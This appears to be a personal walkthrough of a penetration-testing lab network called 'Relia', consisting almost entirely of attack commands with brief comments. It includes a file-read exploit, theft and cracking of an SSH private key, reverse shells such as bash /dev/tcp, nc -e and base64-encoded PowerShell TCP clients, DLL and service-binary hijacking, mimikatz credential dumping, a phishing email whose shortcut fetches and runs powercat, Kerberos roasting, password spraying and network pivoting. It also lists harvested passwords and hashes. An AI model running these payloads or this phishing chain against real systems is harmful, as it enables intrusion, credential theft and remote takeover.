Initial enumeration
```
nmap -sT -A -oN nmap-relia 192.168.188.245-250 192.168.188.189 192.168.188.191
```

.245 WEB01
```
# https://www.exploit-db.com/exploits/50383
# targets.txt - http://192.168.188.245

/bin/bash ./50383.sh targets.txt /etc/passwd

# RCE does not work
/bin/bash ./50383.sh targets.txt /bin/sh ls
```
found users
- offsec
- miranda
- steven
- mark
- anita
```
# enum different types of RSA keys
/bin/bash ./50383.sh targets.txt /home/anita/.ssh/id_ecdsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----

ssh2john anita_rsa > anita-ssh.hash

john --wordlist=/usr/share/wordlists/rockyou.txt anita-ssh.hash

# found password - fireball

chmod 600 anita_rsa
ssh -i anita_rsa anita@192.168.188.245 -p 2222

scp -i anita_rsa -P 2222 -r /usr/share/unix-privesc-check anita@192.168.188.245:/home/anita

scp -i anita_rsa -P 2222 -r linpeas.sh anita@192.168.188.245:/home/anita

```

privesc on .245
- This machine does not have an internal interface so we can't move laterally
```
uname -r
uname -a
cat /etc/os-release

# doesn't output anything
searchsploit "linux kernel Ubuntu 20 Local Privilege Escalation"  | grep  "5." | grep -v " < 5.4.0"

# find using linpeas list of exploits
https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt

# google for a better version of the exploit that just works
scp -i anita_rsa -P 2222 -r exploit-nss.py anita@192.168.188.245:/home/anita
```

.246
```
# Use the same ssh key that worked on .245. success!
ssh -i anita_rsa anita@192.168.196.246 -p 2222

# run linpeas
scp -i anita_rsa -P 2222 -r linpeas.sh anita@192.168.196.246:/home/anita

# findings
/var/crash/test.php
https://github.com/theori-io/CVE-2022-32250-exploit
find an internal webpage on 8000 that seems to be owned by root

# manual enumeration
uname -a
cat /etc/issue

# linux 22.04.1, 5.15.0-52-generic
# these did not work
searchsploit "linux kernel Ubuntu 22 Local Privilege Escalation"  | grep  "5."
scp -i anita_rsa -P 2222 -r exp anita@192.168.196.246:/home/anita

# try to access internal web server running at 127.0.0.1:8000
scp -i anita_rsa -P 2222 -r chisel anita@192.168.196.246:/home/anita

# access the internal webpage at 127.0.0.1:8001
./chisel client 192.168.45.219:8081 R:8001:127.0.0.1:8000

# could not get this to work
./chisel client 192.168.45.219:8081 R:socks

gobuster dir -u http://127.0.0.1:8001 -w /usr/share/wordlists/dirb/big.txt

# https://stackoverflow.com/questions/73079185/burp-proxy-interception-doesnt-work-for-localhosted-web-apps-with-firefox
about:config
allow_hijacking_localhost

# for file inclusion, check if parameters are files
# we find a .inc file as the referrer

# send in burp repeater (no encoding)
/../../../../../../../../../../etc/passwd
/../../../../../../../../../../var/log/apache2/access.log
# directory traversal -> LFI -> RFI

# from linpeas
# Interesting writable files owned by me or writable by everyone (not in Home)
# we find /dev/shm
# Some rules apply to TMP that aren't just seen by normal commands
# `/dev/shm` is a temporary file storage filesystem, similar to tmp

# simple commands work
/backend/?view=/../../../../../../../../../../dev/shm/test.php&cmd=ls

# cmd reverse shells do not work
bash -i >& /dev/tcp/192.168.45.219/4444 0>&1
nc%20192.168.45.219%204444%20-e%20%2Fbin%2Fbash
nc -c /bin/sh 192.168.45.219 4444
bash -i >& /dev/tcp/192.168.45.219/4444 0>&1

# this gets us www-data user
scp -i anita_rsa -P 2222 -r php-reverse-shell.php anita@192.168.196.246:/home/anita

GET /backend/?view=/../../../../../../../../../../dev/shm/php-reverse-shell.php

# www-data user has SUDO nopassword ALL
# obtain root
sudo -l
sudo -i
```
.247
```
# enumeration - we find alt http and ftp ports in high range
ssh -i anita_rsa anita@192.168.196.247 -p 2222

xfreerdp /cert-ignore /u:anita /p:fireball /v:192.168.244.248

nmap -sT -Pn -p 14020,14080 192.168.244.247

sudo nmap -sS -p 14020,14080 192.168.244.247
sudo nmap -O 192.168.244.247 --osscan-guess

gobuster dir -u http://192.168.244.247 -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://192.168.244.247 -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config

# explore FTP server
ftp anonymous@192.168.244.247 -p 14020
get umbraco.pdf
exiftool -a -u umbraco.pdf
pdftotext umbraco.pdf

# found credentials
mark:OathDeeplyReprieve91

searchsploit 'umbraco'
searchsploit -m 49488

python3 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i 'http://web02.relia.com:14080' -c "whoami"

python3 49488.py -u "mark@relia.com" -p "OathDeeplyReprieve91" -i 'http://web02.relia.com:14080' -c powershell.exe -a "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

```
.247 privesc
```
# found user zachary

whoami /priv # has SeImpersonate
powershell
cd C:/Users/public
iwr -uri http://192.168.45.219/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
dir /s local.txt

# these do not work
iwr -uri http://192.168.45.219/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

iwr -uri http://192.168.45.219/Seatbelt.exe.1 -Outfile seatbelt.exe
.\seatbelt.exe -group=all

whoami /groups
# get running processes
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# we have write access on httpd.exe
icacls "C:\xampp\apache\bin\httpd.exe"

# do i have perms to start/stop services
iwr -uri http://192.168.45.219/adduser.exe -Outfile httpd.exe
mv C:\xampp\apache\bin\httpd.exe C:\xampp\apache\bin\httpd.exe.bak
mv httpd.exe C:\xampp\apache\bin\

Restart-Service -Name httpd

$ModifiableFiles = echo 'C:\xampp\mysql\bin\httpd.exe' | Get-ModifiablePath -Literal
```
Potatoes
- https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
- Sharp EFS potato: https://github.com/zcgonvh/EfsPotato

```
iwr -uri http://192.168.45.219/godpotato.exe -Outfile god.exe
iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe

.\god.exe -cmd "cmd /c whoami"
.\god.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.219 9999"
```
root on .247
```
iwr -uri http://192.168.45.219/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

lsadump::cache 
lsadump::sam

# cannot be cracked so save the hash for later
hashcat -m 1000 zachary.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

.248
```
whatweb 192.168.244.248
nmap -sT -Pn -p 10000,30000 192.168.244.248
gobuster dir -u http://192.168.244.248 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.244.248 -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config


crackmapexec smb 192.168.244.248 -u users.txt -p passwords.txt --continue-on-success
impacket-psexec anita:fireball!@192.168.244.248

sudo smbclient //192.168.244.248/transfer
smb: \logs\build\materials\assets\Databases\> get Database.kdbx

# need to remove the Database: part from the keepass.hash file
# got password welcome1
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

crowbar -b rdp -s 192.168.244.248/32 -U users.txt -C passwords.txt -n 1
crowbar -b rdp -s 192.168.244.248/32 -u emma -C passwords.txt -n 1
xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.244.250

# use keepass cli
sudo apt search keepass cli
sudo apt-get install kpcli
# prompts you for master password
kpcli --kdb=/home/kali/relia/Database.kdbx
cd /Database/Windows/
show emma

# SomersetVinyl1!
xfreerdp /cert-ignore /u:emma /p:"SomersetVinyl1\!" /v:192.168.244.248
```

.248 privesc
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f exe -o shell.exe
nc -nvlp 9999

iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

icacls C:\BetaMonitor\BetaMonitor.exe
# found appkey: !8@aBRBYdb3!

# spray above password agains host
crowbar -b rdp -s 192.168.219.248/32 -u mark -C passwords.txt -n 1

# login is mark who is admin
xfreerdp /cert-ignore /u:mark /p:"\!8@aBRBYdb3\!" /v:192.168.219.248
```
.249
```
gobuster dir -u http://192.168.244.249:8000 -w /usr/share/wordlists/dirb/common.txt

evil-winrm -i 172.16.244.249 -u mark -p "OathDeeplyReprieve91" 

crackmapexec smb 192.168.244.248-192.168.244.250 -u users.txt -p passwords.txt --continue-on-success

impacket-psexec anita:fireball@192.168.244.248

# we find that there's a vuln on RiteCMS
# https://www.exploit-db.com/exploits/50614
# can login using default creds, admin:admin

http://192.168.219.249:8000/cms/admin.php?mode=filemanager&directory=media
http://192.168.244.249:8000/cms/media/shell.pHP

# use this shell
# https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
```
.249 privesc
```
# find compiler
Get-ChildItem -Path "C:\" -Include csc.exe -File -Recurse -ErrorAction SilentlyContinue

iwr -uri http://192.168.45.219/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs

iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe

.\efspotato.exe whoami
.\efspotato.exe "nc.exe 192.168.45.219 5555 -e cmd"

iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
lsadump::sam

# these also cannot be cracked
hashcat -m 1000 adrian.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

hashcat -m 1000 damon.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# find damon password in history - i6yuT6tym@

# winpeas won't run - hangs
iwr -uri http://192.168.45.219/winPEAS.bat -Outfile winPEAS.bat

# find hidden files in  C:\staging
ls -Hidden
# find a .git file meaning it's a git repo
git status 
# find a sid
Convert-SidToName S-1-5-21-464543310-226837244-3834982083-1003


xfreerdp /cert-ignore /u:damon /p:"i6yuT6tym@" /v:192.168.219.249

# look in git history for configs
# we see that email config has been changed
PS C:\staging\.git\logs> cat HEAD

git checkout 967fa71c359fffcbeb7e2b72b27a321612e3ad11
git diff 8b430c17c16e6c0515e49c4eafdd129f719fde74

# could also find by checking out old commit and searching
Get-ChildItem -Path C:\staging\htdocs -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.conf,*.conf.bak -File -Recurse -ErrorAction SilentlyContinue

+Email configuration of the CMS
+maildmz@relia.com:DPuBT9tGCBrTbR
+
+If something breaks contact jim@relia.com as he is responsible for the mail server.
+Please don't send any office or executable attachments as they get filtered out for security reasons.
```

.189
```
# enumerate SMTP - none of this provides anything useful as we get the creds from .249
nc -nv 192.168.219.189 25
telnet 192.168.219.189 25
telnet 192.168.219.189 110

nmap -sT -A 192.168.219.189
nmap -sT -p 10000-30000 192.168.219.189
sudo nmap -p 25 --script=smtp-enum-users 192.168.219.189
sudo nmap -p 587 --script=smtp-enum-users 192.168.219.189
nmap -p 25 --script smtp-commands 192.168.219.189

# this did not work
nmap -p 25 --script=smtp-brute 192.168.219.189

# these don't help us
crackmapexec winrm 192.168.219.189 -u mark -p passwords.txt
hydra -l smtp-users.txt -P /usr/share/wordlists/rockyou.txt 192.168.219.189 smtp
hydra -l smtp-users.txt -P passwords.txt 192.168.219.189 smtp

# log into winprep
xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.219.250

# serve up install.lnk and config.Library-ms from webdav
mkdir /home/kali/relia/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

# serve up powercat.ps1 from 8000
python3 -m http.server 8000

# note that install.lnk and config.Library-ms must go into the webdav directory
sudo swaks -t jim@relia.com --from damon@relia.com --attach @config.Library-ms --server 192.168.246.189 --body @body.txt --header "Subject: Git logs"

```
install shortcut
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.219:8000/powercat.ps1'); powercat -c 192.168.45.219 -p 4444 -e powershell"
```

try to get proof on .189
```
nmap -Pn 192.168.214.189

crackmapexec smb 192.168.214.189 -u Administrator -p admin-password.txt --continue-on-success

crackmapexec smb  192.168.214.189 -u Administrator -p admin-password.txt -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

.14
```
iwr -uri http://192.168.45.219/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

iwr -uri http://192.168.45.219/Seatbelt.exe.1 -Outfile seatbelt.exe
.\seatbelt.exe -group=all

# find 
C:\Users\jim\AppData\Local\Microsoft\OneDrive\OneDrive.exe
C:\Users\jim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini

# in this file are two passwords - DPuBT9tGCBrTbR, Castello1! (username jim)
powershell -ep bypass -File C:\Users\jim\Pictures\exec.ps1
C:\Users\jim\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
    C:\Users\jim\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt
    
jim::RELIA:1122334455667788:a4f6c244ed4ca9065431c44b4f275897:010100000000000057688d753822da01f0be279ff60793d6000000000800300030000000000000000000000000200000957fbc8ab071145d2fda7d118a6dcc6c3bc87d49c1efe0008c0e59f18fb24be20a00100000000000000000000000000000000000090000000000000000000000 

C:\Users\jim\Documents\Database.kdbx
```

.14 privesc - jk there is no need for this as we have local admin
```
iwr -uri http://192.168.45.219:8000/adduser.ps1 -Outfile exec.ps1

net use \\192.168.45.219\smb
copy Database.kdbx \\192.168.45.219\smb

keepass2john Database.kdbx > keepass2.hash
hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# got password - mercedes1
kpcli --kdb=/home/kali/relia/Database2.kdbx
cd /Database/General
show 0

Username: dmzadmin
Pass: SlimGodhoodMope

Username: jim
Pass: Castello1!

iwr -uri http://192.168.45.219:8000/chisel.exe -Outfile chisel.exe
.\chisel.exe client 192.168.45.219:8081 R:socks

sudo proxychains -q nmap -sT -Pn -p 22,80,8000,445,3306,3389 172.16.109.14

proxychains impacket-psexec jim:"Castello1\!"@172.16.109.14

# only jim works
proxychains crackmapexec smb 172.16.109.14 -u users.txt -p passwords.txt --continue-on-success

# this won't work, have to use the swaks command to get a shell
sudo proxychains xfreerdp /v:172.16.109.14 /u:jim /p:"Castello1\!" /cert-ignore /compression /auto-reconnect

# failed attempt, uploading powerup works, but no ability to restart services
iwr -uri http://192.168.45.219/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
$ModifiableFiles = echo 'C:\Users\jim\AppData\Local\Microsoft\OneDrive\OneDrive.exe' | Get-ModifiablePath -Literal

iwr -uri http://192.168.45.219:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
.\SharpHound.ps1

```
.14 as-rep roasting
```
impacket-GetNPUsers -dc-ip 192.168.214.14  -request -outputfile hashes.asreproast relia.com/jim

# determine if we can as-rep roast any users
wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1

iwr -uri http://192.168.45.219:8000/PowerView.ps1 -Outfile PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired
Get-Module -ListAvailable

# try on windows host with rubeus
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

iwr -uri http://192.168.45.219:8000/Rubeus.exe -Outfile Rubeus.exe

.\rubeus.exe asreproast /nowrap

# get michelle's hash
$krb5asrep$michelle@relia.com:79E53520A15B4689C962B90611570895$E09A752854E0E23F3914E16104862DF7B85A8A81D2BFFA8DC46E3498BEAF98A069DC1979D1D268557C94DF38694A74A2A50460D72A9EE764FECF6D0E8CCBCAC1FC80578D714D7C291B587D1A10624957034C22FFDA35698560ED92A6B280CF74F169F38C03EE4C86406205CE07CA06498B7FDC2B1CA843BC43E2C8BEA4055F3CD5502FB1B3A64529360335CDE731C59357928AF4595D833636BC5C5046B385C0BFD3048BBE8AE7EC07BA301CBEB32FF64F57FC0C5E41A9AF5A407BD6CB1BEEEB0DF59EDC5B7FD64B44CA53B5BD20FB451ABF5CECB19A2EE07BDC10E917AFD4B0976D55D0F665

# save to file michelle.hash - get NotMyPassword0k?

sudo hashcat -m 18200 michelle.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
.191
```
crackmapexec smb 192.168.219.191 -u jim -p passwords.txt --continue-on-success
# jim's castello PW from .14 works here

nmap -sT -A 192.168.219.191

# find dmzadmin is a user on 191
crowbar -b rdp -s 192.168.219.191/32 -U users.txt -C passwords.txt -n 1
xfreerdp /cert-ignore /u:dmzadmin /p:SlimGodhoodMope /v:192.168.188.191

# is it actually DMZ
ipconfig /all
# yes

iwr -uri http://192.168.45.219:8000/chisel.exe -Outfile chisel.exe
.\chisel.exe client 192.168.45.219:8081 R:socks
```
From chisel on 191 enumerate internal network
```
sudo proxychains -q nmap -sT -oN nmap-relia-internal -Pn -p 80,21,22,3389,445 172.16.109.6-7 172.16.109.15 172.16.109.19-21 172.16.109.30

# all fail
proxychains crackmapexec smb 172.16.109.6-7 172.16.109.15 172.16.109.19-21 172.16.109.30 -u dmzadmin -p SlimGodhoodMope --continue-on-success

# all success
proxychains crackmapexec smb 172.16.109.6-7 172.16.109.15 172.16.109.19-21 172.16.109.30 -u jim -p "Castello1\!" --continue-on-success

proxychains crowbar -b rdp -s 172.16.109.6/32 -u jim -C passwords.txt -n 1
proxychains crowbar -b rdp -s 172.16.109.7/32 -u dmzadmin -C passwords.txt -n 1

Castello1!
proxychains ssh jim@172.16.109.20
proxychains ssh dmzadmin@172.16.109.20
```
install ligolo - https://github.com/nicocha30/ligolo-ng
```
# helpful article (includes double pivot) - https://4pfsec.com/ligolo

# windows agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip
unzip ligolo-ng_agent_0.4.4_windows_amd64.zip

# linux proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
tar -xzvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.g

# linux agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz
tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.tar.g

# from kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# from proxy on kali
>> session
>> start

# add route to internal network
sudo ip route add 172.16.104.0/24 dev ligolo

# check route
ip route

# delete old routes
sudo ip route del 172.16.78.0/24 dev ligolo

# from windows target
iwr -uri http://192.168.45.219:8000/agent.exe -Outfile agent.exe
./agent.exe -ignore-cert -connect 192.168.45.219:11601

```
.7
```
gobuster dir -u http://172.16.136.7 -w /usr/share/wordlists/dirb/big.txt
nmap -sT -A 172.16.136.7
nmap -sT -p 5589 172.16.136.7

# michelle's creds work
crowbar -b rdp -s 172.16.136.7/32 -u michelle -c "NotMyPassword0k\?" -n 1

xfreerdp /cert-ignore /u:michelle /p:NotMyPassword0k\? /v:172.16.136.7
```
.7 enumeration
```
# get a better shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=9999 -f exe -o shell.exe
nc -nvlp 9999

iwr -uri http://192.168.45.219:8000/shell.exe -Outfile shell.exe

iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# history
C:\Users\michelle\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# user: andrea

# interesting processes
C:\xampp\apache\bin\httpd.exe
C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
C:\Scheduler\scheduler.exe

Get-ChildItem -Path C:\Users\michelle\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
```
.7 privesc
```
impacket-smbserver -smb2support -user michelle -password NotMyPassword0k\? smb smb 
net use \\192.168.45.219\smb
copy scheduler.exe \\192.168.45.219\smb
copy customlib.dll \\192.168.45.219\smb

# from winprep
xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.246.250

New-Item -ItemType Directory -Path C:\Scheduler
iwr -uri http://192.168.45.219:8000/scheduler.exe -Outfile C:\Scheduler\scheduler.exe
iwr -uri http://192.168.45.219:8000/customlib.dll -Outfile C:\Scheduler\customlib.dll
# need to create the service in order to see missing dlls
New-Service -Name scheduler -BinaryPathName C:\Scheduler\scheduler.exe
# with procmon filter running we can restart the service
Restart-Service scheduler

# we have found that beyondhelper.dll is the missing DLL so we can replace it
# scheduler service has a DLL. we cannot write it, but we can stop and start
net stop scheduler
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
iwr -uri http://192.168.45.219:8000/myDLL.dll -Outfile C:\Scheduler\beyondhelper.dll
Restart-Service scheduler

# replace DLL with a reverse shell payload once we have determined a user can be added, then restart the service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.219 LPORT=4445 -f dll -o shell.dll
iwr -uri http://192.168.45.219:8000/shell.dll -Outfile C:\Scheduler\beyondhelper.dll
```
.7 Post-exploitation
```
Get-ChildItem -Path C:\Users\Administrator\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -Fi:le -Recurse -ErrorAction SilentlyContinue

iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 

# find andrea NTLM and password PasswordPassword_6 (no need to crack hash)
hashcat -m 1000 andrea.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# does not connect to ldap
iwr -uri http://192.168.45.219:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:/Users/michelle

net use \\192.168.45.219\smb
copy 20231129130221_BloodHound.zip \\192.168.45.219\smb

# start bloodhound from kali
bloodhound

# find that dan is domain admin
# find iis_service is kerberoastable
# shortest path to domain admins is through RELIA.COM
```

.15 enumeration
```
172.16.109.6-7 172.16.109.15 172.16.109.19-21 172.16.109.30

# can login on 15
crowbar -b rdp -s 172.16.136.15/32 -u andrea -c "PasswordPassword_6" -n 1

xfreerdp /cert-ignore /u:andrea /p:PasswordPassword_6 /v:172.16.136.15

# use port 9999 for a better shell
iwr -uri http://192.168.45.219:8000/shell.exe -Outfile shell.exe

Get-ChildItem -Path C:\Users\andrea\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.conf -File -Recurse -ErrorAction SilentlyContinue

iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

C:\Users\andrea\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# find users offsec and milana
    C:\Users\andrea\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\ZxcvbnData\3.0.0.0\passwords.txt

C:\schedule.ps1

File: C:\Users\andrea\AppData\Roaming\KeePass\KeePass.config.xml
